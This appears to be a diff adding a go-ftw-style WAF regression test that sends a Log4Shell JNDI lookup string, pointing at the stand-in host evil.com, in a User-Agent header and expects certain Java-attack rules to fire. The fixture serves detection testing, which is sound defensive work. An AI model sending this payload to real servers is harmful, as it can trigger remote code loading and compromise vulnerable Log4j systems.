@@ -1,0 +1,17 @@
+# TR-07b corpus case (go-ftw shape) — source: live probe matrix
+# (probe against the committed engine.conf; see README delta table).
+name: 10-log4j-ua
+surface: "log4j JNDI lookup in User-Agent"
+request:
+  method: "GET"
+  uri: "/"
+  version: "1.1"
+  headers:
+    Host: "trishula.local"
+    User-Agent: "${jndi:ldap://evil.example.com/a}"
+expect:
+  # engine-mirror-noise pin (setup + threshold echoes; README).
+  phase1_pinned: [900000, 900110, 900990]
+  # 941010 demoted via ctl:ruleRemoveTargetById (990002); README.
+  p1_941010: true
+  phase2_seed: [944150, 944151, 944152]
